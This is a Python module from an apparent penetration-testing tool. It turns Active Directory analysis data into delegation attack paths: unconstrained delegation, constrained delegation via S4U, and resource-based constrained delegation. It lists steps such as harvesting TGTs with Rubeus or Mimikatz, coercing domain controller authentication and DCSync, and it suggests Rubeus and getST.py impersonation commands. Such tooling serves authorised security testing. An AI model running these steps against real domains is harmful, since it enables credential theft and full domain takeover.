"""ReconForge AD Attack Paths — Delegation abuse opportunities.

Author: Andrews Ferreira
"""

from typing import Any

from modules.ad.attack_paths.base import (
    AttackChain,
    AttackPathBuilderBase,
    AttackPathResult,
    NextStepSuggestion,
)


class DelegationPathBuilder(AttackPathBuilderBase):
    """Build delegation abuse attack paths."""

    BUILDER_NAME = "delegation"

    def build(
        self, analysis_data: dict[str, Any],
        target: str = "", domain: str = "", **kwargs,
    ) -> AttackPathResult:
        result = AttackPathResult(builder=self.BUILDER_NAME)

        self._build_unconstrained(analysis_data, target, domain, result)
        self._build_constrained(analysis_data, target, domain, result)
        self._build_rbcd(analysis_data, target, domain, result)

        return result

    def _build_unconstrained(
        self, data: dict, target: str, domain: str, result: AttackPathResult,
    ) -> None:
        unconstrained = data.get("unconstrained_delegation", [])
        non_dc = [e for e in unconstrained if not getattr(e, "is_dc", False)]

        for entry in non_dc:
            name = getattr(entry, "account_name", str(entry))
            atype = getattr(entry, "account_type", "unknown")
            result.chains.append(AttackChain(
                name=f"Unconstrained Delegation Abuse: {name}",
                description=f"Compromise {name} to harvest TGTs",
                steps=[
                    f"Compromise {name} ({atype})",
                    "Extract cached TGTs (Rubeus / Mimikatz)",
                    "Coerce DC auth (PrinterBug / PetitPotam)",
                    "Capture DC TGT → DCSync / full domain compromise",
                ],
                risk="critical",
                prerequisites=[f"Access to {name}"],
                references=["https://attack.mitre.org/techniques/T1558/"],
                source=name,
                target="Domain Admin",
                chain_type="unconstrained_delegation",
            ))

        if non_dc:
            first = getattr(non_dc[0], "account_name", str(non_dc[0]))
            result.suggestions.append(NextStepSuggestion(
                command=f"Rubeus.exe monitor /interval:5 /nowrap (on {first})",
                justification="Monitor for incoming TGTs on unconstrained delegation host",
                priority="critical",
            ))

    def _build_constrained(
        self, data: dict, target: str, domain: str, result: AttackPathResult,
    ) -> None:
        constrained = data.get("constrained_delegation", [])
        proto_trans = [e for e in constrained if getattr(e, "protocol_transition", False)]

        for entry in proto_trans:
            name = getattr(entry, "account_name", "")
            targets = getattr(entry, "allowed_to_delegate_to", [])
            targets_str = ", ".join(targets[:3])
            result.chains.append(AttackChain(
                name=f"Constrained Delegation (S4U) Abuse: {name}",
                description=f"Use {name} to impersonate any user to: {targets_str}",
                steps=[
                    f"Obtain credentials for {name}",
                    "Request S4U2Self ticket for target user",
                    f"Request S4U2Proxy ticket to {targets_str}",
                    "Access target service as impersonated user",
                ],
                risk="critical",
                prerequisites=[f"Credentials for {name}"],
                source=name,
                target=targets_str,
                chain_type="constrained_delegation",
            ))

        if proto_trans:
            first = proto_trans[0]
            name = getattr(first, "account_name", "")
            spn = getattr(first, "allowed_to_delegate_to", [""])[0]
            result.suggestions.append(NextStepSuggestion(
                command=(
                    f"getST.py -spn '{spn}' -impersonate Administrator "
                    f"{domain}/{name}:PASSWORD -dc-ip {target}"
                ),
                justification="Exploit constrained delegation with protocol transition",
                priority="critical",
            ))

    def _build_rbcd(
        self, data: dict, target: str, domain: str, result: AttackPathResult,
    ) -> None:
        rbcd = data.get("rbcd", [])
        maq = data.get("machine_account_quota", -1)

        for entry in rbcd:
            tgt_account = getattr(entry, "target_account", str(entry))
            result.chains.append(AttackChain(
                name=f"RBCD Abuse: {tgt_account}",
                description=f"Exploit RBCD on {tgt_account}",
                steps=[
                    (
                        f"Create computer account (MAQ={maq})"
                        if maq > 0 else "Control an existing computer account"
                    ),
                    f"Add computer to {tgt_account}'s AllowedToActOnBehalf",
                    "Request S4U2Self + S4U2Proxy tickets",
                    "Access target as impersonated user",
                ],
                risk="critical",
                prerequisites=[
                    "Authenticated domain access",
                    f"MAQ > 0 (current: {maq})" if maq > 0 else "Computer account control",
                ],
                references=["https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"],
                source="attacker",
                target=tgt_account,
                chain_type="rbcd",
            ))
